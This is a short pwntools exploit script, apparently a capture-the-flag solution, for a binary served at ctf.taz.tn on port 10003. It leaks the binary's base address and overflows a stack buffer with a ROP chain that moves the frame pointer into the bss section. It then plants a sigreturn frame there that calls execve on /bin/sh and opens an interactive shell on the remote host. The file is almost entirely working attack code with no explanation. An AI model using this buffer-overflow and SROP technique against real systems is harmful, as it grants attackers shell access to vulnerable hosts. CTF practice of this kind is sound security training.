from pwn import*
context.arch="amd64"
context.binary = ELF("./main")
context.terminal="xterm"
DEBUG=0
nc="nc ctf.taz.tn 10003"
r=nc.split(" ")
b="./main"
e=ELF(b)
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,"b *vuln +70")
else:
    p=remote(r[1],int(r[2]))
p.recvuntil(b"have ")
e.address = int(p.recvuntil(b" ")[:-1])-e.sym.vuln
bss = e.address + 0x4700
poprbp = e.address + 0x1144
syscall = e.address + 0x116d
print(f"binary base: {hex(e.address)}")
payload = b"a"*40+p64(0)+p64(0)+p64(poprbp)+p64(bss)+p64(e.sym.vuln+46) # return to pop rbp; rbp = bss ; return to vuln + 46 so we can fgets in bss area and write our sigreturn frame
p.sendline(payload)

frame = SigreturnFrame()

frame.rax = 59

frame.rdi = bss-0x30

frame.rsi = 0

frame.rdx = 0

frame.rip = syscall


payload_bss=b"/bin/sh\x00" # bin sh 
payload_bss+=b"a"*0x20#padding 
payload_bss+=p64(15) # (rax)i = 15 : sigreturn
payload_bss+=p64(0) # rbp
payload_bss+=p64(syscall) # return to syscall
payload_bss+=bytes(frame) # our sigreturnframe

p.sendline(payload_bss)
p.interactive()